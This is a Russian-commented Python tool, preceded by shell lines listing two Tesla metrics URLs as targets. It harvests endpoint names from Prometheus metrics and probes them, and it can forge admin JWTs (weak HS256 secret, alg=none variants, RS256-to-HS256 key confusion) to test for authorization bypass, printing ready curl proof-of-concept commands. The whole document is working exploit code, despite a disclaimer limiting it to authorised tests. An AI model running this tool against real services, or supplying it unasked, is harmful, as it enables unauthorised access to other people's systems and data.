# cat metrics.txt

# https://api-income.tesla.com/metrics
# https://api-income.test.tesla.com/metrics

# python3 metrics_prober.py -u metrics.txt

# python3 metrics_prober.py -u metrics.txt --jwt-test

#!/usr/bin/env python3
"""
Парсит метрики в формате Prometheus, вытаскивает значения endpoint="...",
дёргает соответствующие URL и помечает [HIT], если ответ 200 OK
и Content-Type = application/json / application/problem+json / text/plain,
либо статус 405 (эндпоинт существует, GET не разрешён).

Опционально (--jwt-test) по каждому эндпоинту прогоняет проверку обхода
авторизации через подделанные JWT (слабый секрет HS256, alg=none, RS256->HS256
key confusion) с негативным контролем — ТОЛЬКО для авторизованных проверок
собственных/тестовых таргетов.

Использование:
    python metrics_probe.py https://bots.test.vlasnyirakhunok.ua/metrics
    python metrics_probe.py -u urls.txt
    python metrics_probe.py -u urls.txt --jwt-test
    python metrics_probe.py <url> --jwt-test --jwt-secret secret --jwt-cookie-name access_token

Файл для -u/--urls: по одной ссылке на метрики в строке; пустые строки
и строки, начинающиеся с #, игнорируются.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import secrets
import sys
import time
from urllib.parse import urlsplit, urlunsplit

import requests

# endpoint="..." в любом месте строки метрики
ENDPOINT_RE = re.compile(r'endpoint="([^"]+)"')

HIT_CONTENT_TYPES = ("application/json", "application/problem+json", "text/plain")

# некоторые парсеры сравнивают alg регистрозависимо — пробуем все варианты
ALG_NONE_CASES = ("none", "None", "NONE")

# тривиальные health-check тела — считаются false positive при JWT-проверке
TRIVIAL_BODY_VALUES = {
    "ok", "healthy", "true", "success", "pong", "up", "alive", "yes", "1", "0",
    "null", "none", "ready", "running", "active", "pass", "passed", "green",
}
HEALTH_LIKE_JSON_KEYS = {"status", "health", "state", "result", "message"}


# ---------------------------------------------------------------------------
# Парсинг метрик и базовый пробник
# ---------------------------------------------------------------------------

def fetch_metrics(source: str, timeout: float, verify: bool) -> str:
    """Читает метрики из URL или из локального файла."""
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout, verify=verify)
        resp.raise_for_status()
        return resp.text
    with open(source, "r", encoding="utf-8") as f:
        return f.read()


def base_url(source: str) -> str:
    """https://host:port/metrics -> https://host:port (схема + хост)."""
    parts = urlsplit(source)
    return urlunsplit((parts.scheme, parts.netloc, "", "", ""))


def extract_endpoints(text: str) -> list[str]:
    """Все уникальные endpoint из метрик, в порядке первого появления."""
    seen = set()
    result = []
    for match in ENDPOINT_RE.finditer(text):
        ep = match.group(1)
        if ep not in seen:
            seen.add(ep)
            result.append(ep)
    return result


def build_url(base: str, endpoint: str) -> str:
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint
    return base + endpoint


def ctype_of(resp: requests.Response) -> str:
    """Content-Type без charset, в нижнем регистре."""
    return resp.headers.get("Content-Type", "").split(";")[0].strip().lower()


def is_hit(resp: requests.Response) -> bool:
    if resp.status_code == 200:
        return ctype_of(resp) in HIT_CONTENT_TYPES
    if resp.status_code == 405:
        return True
    return False


def is_trivial_body(content: bytes) -> bool:
    """Тело вида 'OK'/'healthy'/{"status":"ok"} — не реальные данные, false positive."""
    try:
        text = content.decode("utf-8", errors="ignore").strip()
    except Exception:
        return False
    if not text:
        return False

    if text.strip("\"' \t\n").lower() in TRIVIAL_BODY_VALUES:
        return True

    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return False

    if isinstance(data, dict) and 1 <= len(data) <= 3:
        if {k.lower() for k in data} & HEALTH_LIKE_JSON_KEYS:
            for v in data.values():
                if isinstance(v, bool):
                    continue
                if isinstance(v, str) and v.strip("\"' \t\n").lower() in TRIVIAL_BODY_VALUES:
                    continue
                return False
            return True
    return False


# ---------------------------------------------------------------------------
# JWT-подделки (порт из auth_checker.py --jwt-test)
# ---------------------------------------------------------------------------

def default_jwt_payload() -> dict:
    """Generic admin payload; iat/nbf/exp считаются на момент вызова."""
    now = int(time.time())
    return {
        "sub": "admin", "user": "admin", "role": "admin", "admin": True,
        "iat": now, "nbf": now - 60, "exp": now + 60 * 60 * 24 * 365,
    }


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _header_payload(header: dict, payload: dict) -> str:
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}"


def make_jwt_hs256(secret: str, payload: dict) -> str:
    hp = _header_payload({"alg": "HS256", "typ": "JWT"}, payload)
    sig = hmac.new(secret.encode(), hp.encode(), hashlib.sha256).digest()
    return f"{hp}.{b64url(sig)}"


def make_jwt_none(payload: dict, alg_value: str = "none") -> str:
    hp = _header_payload({"alg": alg_value, "typ": "JWT"}, payload)
    return f"{hp}."  # пустая подпись


def make_jwt_garbage(payload: dict) -> str:
    """Правильная структура HS256, заведомо неверная подпись — негативный контроль."""
    hp = _header_payload({"alg": "HS256", "typ": "JWT"}, payload)
    return f"{hp}.{b64url(secrets.token_bytes(32))}"


def make_jwt_rs256_confusion(rsa_public_key_pem: bytes, payload: dict) -> str:
    """RS256->HS256 key confusion: публичный RSA-ключ используется как HMAC-секрет."""
    hp = _header_payload({"alg": "HS256", "typ": "JWT"}, payload)
    sig = hmac.new(rsa_public_key_pem, hp.encode(), hashlib.sha256).digest()
    return f"{hp}.{b64url(sig)}"


def load_rsa_public_key(source: str, timeout: float = 10.0) -> bytes:
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout)
        resp.raise_for_status()
        return resp.content
    with open(source, "rb") as f:
        return f.read()


def build_curl_poc(url: str, delivery: str, token: str, header_name: str, cookie_name: str) -> str:
    if delivery == "bearer":
        return f"curl -i -H '{header_name}: Bearer {token}' '{url}'"
    return f"curl -i -H 'Cookie: {cookie_name}={token}' '{url}'"


def run_jwt_checks(url: str, timeout: float, verify: bool, secret: str, payload: dict,
                   header_name: str, cookie_name: str,
                   rsa_pubkey_pem: bytes | None = None) -> list[dict]:
    """Прогоняет набор подделанных токенов двумя способами доставки (Bearer / cookie).
    Возвращает список чеков: каждый — dict с полями kind/delivery/accepted/is_control/..."""
    tokens: dict[str, tuple[str, bool]] = {
        "hs256_weak_secret": (make_jwt_hs256(secret, payload), False),
    }
    for case in ALG_NONE_CASES:
        tokens[f"alg_{case}"] = (make_jwt_none(payload, case), False)
    tokens["alg_none_empty_payload"] = (make_jwt_none({}), False)
    if rsa_pubkey_pem:
        tokens["rs256_to_hs256_confusion"] = (make_jwt_rs256_confusion(rsa_pubkey_pem, payload), False)
    tokens["garbage_signature"] = (make_jwt_garbage(payload), True)  # негативный контроль

    checks = []
    for kind, (token, is_control) in tokens.items():
        for delivery in ("bearer", "cookie"):
            headers, cookies = {}, {}
            if delivery == "bearer":
                headers[header_name] = f"Bearer {token}"
            else:
                cookies[cookie_name] = token

            try:
                resp = requests.get(url, timeout=timeout, verify=verify,
                                    headers=headers, cookies=cookies, allow_redirects=False)
            except requests.RequestException as e:
                checks.append({
                    "kind": kind, "delivery": delivery, "is_control": is_control,
                    "error": str(e), "accepted": False,
                })
                continue

            ctype = ctype_of(resp)
            body_size = len(resp.content)
            trivial = is_trivial_body(resp.content)
            accepted = (resp.status_code == 200 and ctype in HIT_CONTENT_TYPES
                        and body_size > 0 and not trivial)
            checks.append({
                "kind": kind, "delivery": delivery, "is_control": is_control,
                "status": resp.status_code, "content_type": ctype,
                "body_size": body_size, "is_trivial_body": trivial,
                "accepted": accepted,
                "curl_poc": build_curl_poc(url, delivery, token, header_name, cookie_name),
            })
    return checks


def classify_jwt_verdict(baseline_ok: bool, checks: list[dict]) -> str:
    """
    no_auth_required      — эндпоинт и без токена отдаёт реальные данные (авторизации нет)
    signature_not_validated — принят даже мусорный токен (подпись не проверяется)
    confirmed_vulnerable  — принят подделанный токен (слабый секрет / alg=none / confusion)
    protected             — все подделки отклонены
    """
    if baseline_ok:
        return "no_auth_required"
    if any(c.get("accepted") for c in checks if c.get("is_control")):
        return "signature_not_validated"
    if any(c.get("accepted") for c in checks if not c.get("is_control")):
        return "confirmed_vulnerable"
    return "protected"


JWT_VERDICT_LABELS = {
    "confirmed_vulnerable": "[!!! ПОДТВЕРЖДЕНО] принят подделанный JWT (слабый секрет / alg=none / confusion)",
    "signature_not_validated": "[!] подпись JWT не проверяется (принят даже мусорный токен)",
    "no_auth_required": "[i] эндпоинт отдаёт данные без токена — авторизация не требуется",
    "protected": "[OK] все подделанные токены отклонены",
}


# ---------------------------------------------------------------------------
# Пробник одного эндпоинта
# ---------------------------------------------------------------------------

def probe(base: str, endpoint: str, timeout: float, verify: bool,
          jwt_opts: dict | None = None) -> dict | None:
    """GET эндпоинта. Печатает [HIT]/[ERR]. При jwt_opts — ещё и JWT-проверку.
    Возвращает dict-находку (HIT или интересный JWT-вердикт), иначе None."""
    url = build_url(base, endpoint)
    try:
        resp = requests.get(url, timeout=timeout, verify=verify, allow_redirects=False)
    except requests.RequestException as e:
        print(f"[ERR]  {url}  ({e.__class__.__name__})")
        return None

    ctype = ctype_of(resp)
    hit = is_hit(resp)
    baseline_ok = (resp.status_code == 200 and ctype in HIT_CONTENT_TYPES
                   and len(resp.content) > 0 and not is_trivial_body(resp.content))

    if hit:
        print(f"[HIT]  {url}  {resp.status_code}  {ctype}")

    finding: dict | None = None
    if hit:
        finding = {
            "source": base, "endpoint": endpoint, "url": url,
            "status": resp.status_code, "content_type": ctype,
        }

    if jwt_opts is not None:
        checks = run_jwt_checks(
            url, timeout, verify,
            jwt_opts["secret"], jwt_opts["payload"],
            jwt_opts["header_name"], jwt_opts["cookie_name"],
            jwt_opts.get("rsa_pubkey_pem"),
        )
        verdict = classify_jwt_verdict(baseline_ok, checks)
        accepted = [c for c in checks if c.get("accepted")]
        bypass = verdict in ("confirmed_vulnerable", "signature_not_validated")

        # Консоль: печатаем ТОЛЬКО реальный bypass, чтобы не флудить на protected/no_auth.
        if bypass:
            print(f"[JWT!] {url}  {JWT_VERDICT_LABELS.get(verdict, verdict)}")
            for c in accepted:
                tag = "КОНТРОЛЬ принят" if c.get("is_control") else "forged принят"
                print(f"       [{tag}] {c['kind']}/{c['delivery']}  PoC: {c.get('curl_poc')}")

        # JSON: bypass и no_auth фиксируем как находку; protected не пишем.
        if verdict in ("confirmed_vulnerable", "signature_not_validated", "no_auth_required"):
            if finding is None:
                finding = {
                    "source": base, "endpoint": endpoint, "url": url,
                    "status": resp.status_code, "content_type": ctype,
                }
            finding["jwt_verdict"] = verdict
            finding["jwt_bypass"] = bypass
            if verdict == "no_auth_required":
                finding["jwt_poc"] = [f"curl -i '{url}'"]  # токен не нужен вовсе
            else:
                finding["jwt_poc"] = [c["curl_poc"] for c in accepted if c.get("curl_poc")]

    return finding


def read_url_list(path: str) -> list[str]:
    urls = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def main() -> int:
    parser = argparse.ArgumentParser(description="Парсер метрик + пробник эндпоинтов")
    parser.add_argument("sources", nargs="*", help="URL метрик (/metrics) или файл с дампом")
    parser.add_argument("-u", "--urls", action="append", default=[], metavar="FILE",
                        help="файл со списком ссылок на метрики (можно указать несколько раз)")
    parser.add_argument("--timeout", type=float, default=10.0, help="таймаут запроса, сек (10)")
    parser.add_argument("--insecure", action="store_true", help="не проверять TLS-сертификат")
    parser.add_argument("--report", default="report.json", metavar="FILE",
                        help="куда писать находки (по умолчанию report.json)")

    jwt = parser.add_argument_group("JWT-тест (только для авторизованных проверок своих таргетов)")
    jwt.add_argument("--jwt-test", action="store_true",
                     help="проверить обход авторизации подделанными JWT (слабый секрет, alg=none, "
                          "RS256->HS256 confusion) с негативным контролем")
    jwt.add_argument("--jwt-secret", default="secret", help="секрет для HS256 (по умолчанию 'secret')")
    jwt.add_argument("--jwt-payload", metavar="FILE",
                     help="JSON-файл с claims (по умолчанию generic admin payload)")
    jwt.add_argument("--jwt-header-name", default="Authorization",
                     help="заголовок для Bearer (по умолчанию Authorization)")
    jwt.add_argument("--jwt-cookie-name", default="access_token",
                     help="имя cookie для cookie-доставки (по умолчанию access_token)")
    jwt.add_argument("--jwt-rsa-pubkey", metavar="FILE|URL",
                     help="PEM публичного RSA-ключа (файл или URL) для RS256->HS256 confusion")

    args = parser.parse_args()
    verify = not args.insecure

    jwt_opts = None
    if args.jwt_test:
        payload = default_jwt_payload()
        if args.jwt_payload:
            try:
                with open(args.jwt_payload, "r", encoding="utf-8") as f:
                    payload = json.load(f)
            except (OSError, json.JSONDecodeError) as e:
                print(f"Не удалось прочитать --jwt-payload: {e}", file=sys.stderr)
                return 1
        rsa_pubkey_pem = None
        if args.jwt_rsa_pubkey:
            try:
                rsa_pubkey_pem = load_rsa_public_key(args.jwt_rsa_pubkey, args.timeout)
                print(f"[*] RSA-ключ загружен ({len(rsa_pubkey_pem)} байт) — включаю RS256->HS256 confusion")
            except Exception as e:
                print(f"Не удалось загрузить --jwt-rsa-pubkey: {e}", file=sys.stderr)
                return 1
        jwt_opts = {
            "secret": args.jwt_secret, "payload": payload,
            "header_name": args.jwt_header_name, "cookie_name": args.jwt_cookie_name,
            "rsa_pubkey_pem": rsa_pubkey_pem,
        }
        print("[*] JWT-тест включён. Используйте только против собственных/тестовых таргетов.")

    sources = list(args.sources)
    for list_file in args.urls:
        try:
            sources.extend(read_url_list(list_file))
        except Exception as e:
            print(f"Не удалось прочитать список ссылок из {list_file}: {e}", file=sys.stderr)

    if not sources:
        parser.error("не заданы источники: передайте URL/файл позиционно или через -u/--urls")

    findings: list[dict] = []

    for source in sources:
        try:
            text = fetch_metrics(source, args.timeout, verify)
        except Exception as e:
            print(f"Не удалось получить метрики из {source}: {e}", file=sys.stderr)
            continue

        base = base_url(source) if source.startswith(("http://", "https://")) else None
        if base is None:
            print(f"Источник {source} — локальный файл, укажите базовый URL отдельным аргументом-URL.",
                  file=sys.stderr)
            continue

        endpoints = extract_endpoints(text)
        print(f"\n# {source} -> {base}  (найдено эндпоинтов: {len(endpoints)})")

        for ep in endpoints:
            finding = probe(base, ep, args.timeout, verify, jwt_opts)
            if finding is not None:
                findings.append(finding)

    with open(args.report, "w", encoding="utf-8") as f:
        json.dump(findings, f, ensure_ascii=False, indent=2)

    bypasses = [x for x in findings if x.get("jwt_bypass")]
    print(f"\nНайдено находок: {len(findings)} (JWT-bypass: {len(bypasses)}). Отчёт: {args.report}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
